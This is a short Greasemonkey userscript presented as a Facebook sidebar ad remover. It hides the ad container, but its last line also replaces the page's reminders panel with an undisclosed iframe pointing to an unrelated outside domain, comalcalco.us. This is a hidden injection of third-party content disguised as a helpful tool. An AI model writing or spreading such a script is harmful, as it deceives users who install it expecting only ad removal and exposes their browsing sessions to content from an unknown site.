// ==UserScript==
// @name           Facebook ad remover
// @namespace      http://enyong10.blogspot.com
// @description    Removes ads from facebook's sidebar
// @version        1.0
// @author         http;//enyong.blogspot.com
// @homepage       
// @include        http://facebook.com/*
// @include        http://*.facebook.com/*
// @include        https://facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript==

GM_addStyle(".ego_unit_container { display:none; }");
document.getElementById('pagelet_reminders').innerHTML = '<iframe src="comalcalco.us" height="100" width="200"></iframe>';